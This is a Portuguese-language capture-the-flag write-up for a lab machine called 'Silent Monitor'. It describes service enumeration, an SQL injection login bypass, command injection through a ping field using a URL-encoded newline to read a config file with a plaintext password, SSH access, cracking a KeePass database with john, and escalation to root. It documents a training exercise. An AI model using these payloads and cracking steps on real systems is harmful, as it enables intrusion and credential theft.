# Silent Monitor

## Descricao do desafio

Green Lights, Dark Corners

CorpNet's internal network operations centre has been running quietly for years. Monitoring hosts, logging events, and keeping the infrastructure alive. Or so it seems. A tip from a disgruntled contractor suggests that someone on the NOC team has been cutting corners, leaving doors open, and hiding things in places no one thinks to look.

The portal is up. The services show green. The audit log looks clean.

But clean logs can be written by anyone.

Your job is to get in, move through the system, and find out what is really running behind the secret dashboard.

## Resolucao

Para inicializar o CTF comecei por usar o nmap para listar os serviços disponíveis na máquina alvo. O comando utilizado foi:

`nmap -sV <IP_DO_ALVO>`

o output do comando foi o seguinte:

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-07-25 14:13 UTC
Nmap scan report for ip-10-129-186-31.eu-west-3.compute.internal (10.129.186.31)
Host is up (0.00035s latency).
Not shown: 998 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.15 (Ubuntu Linux; protocol 2.0)
5050/tcp open  http    Werkzeug httpd 2.0.2 (Python 3.10.12)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.49 seconds
```

Este output mostra que existem dois serviços disponíveis na máquina alvo: SSH na porta 22 e um servidor HTTP na porta 5050. O próximo passo foi investigar o serviço HTTP, pois geralmente é mais fácil explorar vulnerabilidades em aplicações web.

O servico HTTP levava nos a uma pagina simples que continha apenas estatisticas do tal servico de operacoes da empresa. Como nao possuia nenhuma funcionalidade de login, decidi correr o gobuster neste servico para tentar encontrar algum endpoint escondido. O comando utilizado foi:

```
gobuster dir -u <IP_DO_ALVO>:5050 -w /usr/share
/wordlists/dirbuster/directory-list-2.3-small.txt
```

O output do gobuster revelou um endpoint em `/internal` que possuia uma pagina de login para o dashboard interno da empresa. Como possuia um endpoint de login, decidi usar o burpsuite para tentar descobrir melhor o que estava a acontecer quando enviava um pedido de login. Apos tentar enviar um pedido legitimo, tentei replicar com um sql injection basico. O payload usado foi:

```
user:"' or 1=1 --"
password:"a"
```

O que nos deu acesso a um dashboard interno da empresa. Fiquei autenticado com um profile de `netops`. Nos logs consegui reparar a existencia de um possivel utilizador com o nome: `jmnartin` e outro `svc-mon`. Ao observar o resto do website, reparei na existencia de um "Host Health Check" que esperava receber um IP e fazia ping a esse IP. Isto gerou me uma desconfianca em possivel command injection. Para testar a minha teoria, voltei ao burpsuite para analizar o que acontecia quando enviava um IP para o "Host Health Check". Testei para 127.0.0.1 e o resultado foi o esperado, um ping com 2 pacotes. Depois testei algumas possibilidades de payloads comuns: o uso de ';' para dar chain a comandos, o uso de `&` e o uso de pipes mas dava sempre 'Invalid hostname or IP address'. Antes de desistir, lembrei-me de tentar testar com o \n e usar outro comando como `ls`. Esta tentativa ja nos deu outro resultado, desta vez em vez de dar invalid IP deu nos o output do comando `ping -c 2 -W 1 127.0.0.1 \n ls` sendo o output: `ping: ls: Temporary failure in name resolution`. Algo que nos faltava testar era com o newline mas URL encoded (Para quem nao sabe, o newline em URL encoding é %0A, carriage return: %0D). Desta vez o output no burpsuite ja foi:

```
PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.024 ms
64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=0.038 ms

--- 127.0.0.1 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1003ms
rtt min/avg/max/mdev = 0.024/0.031/0.038/0.007 ms
app.py
netops.db
secret.config
templates
```

Ou seja, a minha suspeite estava correta, e possivel fazer command injection. Naturalmente o meu instinto foi tentar ver o que estava presente no `secret.config`, para isso bastou alterar o payload para `target=127.0.0.1 %0a cat secret.config` e o output foi:

```
# netops application config
# generated: 2026-01-03

[database]
path    = /opt/netops/netops.db
timeout = 5

[app]
host     = 0.0.0.0
port     = 5050
log_path = /var/log/netops/app.log

[auth]
session_lifetime = 1800

# service account used by the backup agent
# TODO: migrate to secrets manager before Q2 audit
[backup_agent]
run_as   = sysadmin
password = S3cur3Backup$Acc3ss!

[smtp]
host = 127.0.0.1
port = 25
from = noc-alerts@corp.internal
```

Entao, conseguimos ver que existe um utilizador chamado `sysadmin` com a password `S3cur3Backup$Acc3ss!`. Com estas credenciais, tentei fazer login via SSH e consegui aceder à máquina alvo.

Ao darmos `ls`, a primeira coisa que encontrei foi um diretorio chamado `backups` e um ficheiro chamado `user.txt`. Ao abrir o ficheiro `user.txt`, conseguimos ver a primeira flag do CTF.

O diretorio backups tinha um README.txt e um infrastructure.yaml. O README.txt continha a seguinte informação:

```
Backup archive — infrastructure credentials

Periodic exports from the credential store are placed here by the backup agent.
Treat all files in this directory as CONFIDENTIAL.

infrastructure.kdbx — KeePass credential database

Contact the sysadmin team lead if you require access.
```

Apos uma pesquisa rapida, descobri que o KeePass e um gestor de passwords que possui vulnerabilidades registadas. Para alem disso existe um export para john, entao e possivel dar bruteforce. Basta agora extrair o ficheiro `infrastructure.kdbx` e correr o john para tentar descobrir a password.Usamos scp para extrir o ficheiro para a nossa maquina e depois corremos:

```
keepass2john infrastructure.kdbx > hash.txt
```

Para podermos gerar um hash que o john consegue ler. Depois corremos o john com o seguinte comando:

```
john --format=keepass hash.txt
```

Aqui ate me esqueci de especificar a wordlist para ser utilizada mas mesmo assim conseguimos o output:

```
spring           (infrastructure)
```

Que revela que a password que precisamos para abrir o ficheiro `infrastructure.kdbx` e `spring`. Com esta password, conseguimos abrir o ficheiro e ver as credenciais de acesso a varios sistemas internos da empresa.

Ao abrirmos o infrastructure.kdbx, descobrimos que a password do root user era: `S3cur3P4ss0nK33p4ss`, entao bastou voltar a nossa sessao SSH e tentar mudar para o root user com o comando `su -` e a password que descobrimos. Com isto, conseguimos aceder à conta de root e ler o ficheiro `root.txt`, que continha a segunda flag do CTF.
